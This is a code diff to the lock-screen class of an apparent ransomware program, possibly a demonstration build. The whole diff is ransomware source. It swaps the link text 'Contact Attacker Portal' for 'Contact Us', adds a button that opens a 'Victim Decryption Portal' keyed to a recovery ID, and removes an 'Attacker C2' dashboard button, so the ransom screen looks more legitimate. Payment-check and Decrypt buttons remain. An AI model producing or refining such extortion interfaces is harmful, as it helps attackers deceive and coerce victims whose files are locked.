@@ -282,7 +282,7 @@ public final class LockScreen {
         left.add(createLinkButton("How to obtain key?", () ->
             openBrowser(getPortalUrlWithRid())));
         left.add(Box.createVerticalStrut(4));
-        left.add(createLinkButton("Contact Attacker Portal", () ->
+        left.add(createLinkButton("Contact Us", () ->
             openBrowser(getPortalUrlWithRid())));
 
         return left;
@@ -374,6 +374,18 @@ public final class LockScreen {
         portalUrlField.setBorder(new LineBorder(new Color(160, 40, 40), 1));
         portalBox.add(portalUrlField, BorderLayout.CENTER);
 
+        JPanel portalLinkActions = new JPanel(new FlowLayout(FlowLayout.RIGHT, 4, 0));
+        portalLinkActions.setOpaque(false);
+
+        JButton openUrlBtn = new JButton("Open Link");
+        styleSmallButton(openUrlBtn);
+        openUrlBtn.setToolTipText("Open Victim Decryption Portal in your browser");
+        openUrlBtn.addActionListener(e -> {
+            openBrowser(getPortalUrlWithRid());
+            statusMessageLabel.setText("Opening Recovery Portal in browser...");
+        });
+        portalLinkActions.add(openUrlBtn);
+
         JButton copyUrlBtn = new JButton("Copy Link");
         styleSmallButton(copyUrlBtn);
         copyUrlBtn.addActionListener(e -> {
@@ -381,7 +393,8 @@ public final class LockScreen {
                 new java.awt.datatransfer.StringSelection(portalUrlField.getText()), null);
             statusMessageLabel.setText("Recovery Portal URL copied to clipboard.");
         });
-        portalBox.add(copyUrlBtn, BorderLayout.EAST);
+        portalLinkActions.add(copyUrlBtn);
+        portalBox.add(portalLinkActions, BorderLayout.EAST);
 
         bottomActionPanel.add(portalBox);
         bottomActionPanel.add(Box.createVerticalStrut(8));
@@ -484,18 +497,6 @@ public final class LockScreen {
             statusMessageLabel.setText("Opening Recovery Portal in browser...");
         });
         buttonsPanel.add(checkPaymentButton);
-
-        JButton attackerC2Btn = new JButton("Attacker C2");
-        styleActionButton(attackerC2Btn, new Color(124, 58, 237), Color.WHITE);
-        attackerC2Btn.setToolTipText("Open Attacker C2 Dashboard in browser (Presentation Demo)");
-        attackerC2Btn.addActionListener(e -> {
-            String c2Url = portalUrl;
-            if (!c2Url.endsWith("/")) c2Url += "/";
-            c2Url += "c2.html?rid=" + recoveryId;
-            openBrowser(c2Url);
-            statusMessageLabel.setText("Opening Attacker C2 Dashboard in browser...");
-        });
-        buttonsPanel.add(attackerC2Btn);
 
         decryptButton = new JButton("Decrypt");
         styleActionButton(decryptButton, new Color(220, 40, 40), Color.WHITE);
